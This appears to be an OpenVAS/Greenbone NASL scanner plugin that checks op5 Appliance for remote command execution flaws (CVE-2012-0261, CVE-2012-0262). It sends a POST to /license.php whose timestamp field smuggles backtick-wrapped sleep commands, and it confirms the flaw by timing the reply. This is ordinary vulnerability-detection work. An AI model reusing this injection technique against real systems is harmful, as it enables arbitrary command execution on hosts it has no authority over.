CPE = "cpe:/a:op5:monitor";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103380" );
	script_bugtraq_id( 51212 );
	script_cve_id( "CVE-2012-0261", "CVE-2012-0262" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "op5 Appliance Multiple Remote Command Execution Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/51212" );
	script_xref( name: "URL", value: "http://www.op5.com/news/support-news/fixed-vulnerabilities-op5-monitor-op5-appliance/" );
	script_xref( name: "URL", value: "http://www.op5.com/accessories/appliance-server/" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2012-01-09 11:07:18 +0100 (Mon, 09 Jan 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "gb_op5_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "OP5/installed" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more details." );
	script_tag( name: "summary", value: "op5 Appliance is prone to multiple remote command-execution
 vulnerabilities because it fails to properly validate user-
 supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit these issues to execute arbitrary commands
 within the context of the vulnerable system." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( port: port );
filename = NASLString( "/license.php" );
sleep = make_list( 3,
	 5,
	 10 );
for i in sleep {
	ex = NASLString( "timestamp=1317050333`sleep ", i, "`&action=install&install=Install" );
	req = NASLString( "POST ", filename, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Accept-Encoding: identity\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( ex ), "\\r\\n\\r\\n", ex );
	start = unixtime();
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	stop = unixtime();
	if(( stop - start ) < i || ( stop - start ) > ( i + 5 )){
		exit( 99 );
	}
}
security_message( port: port );
exit( 0 );

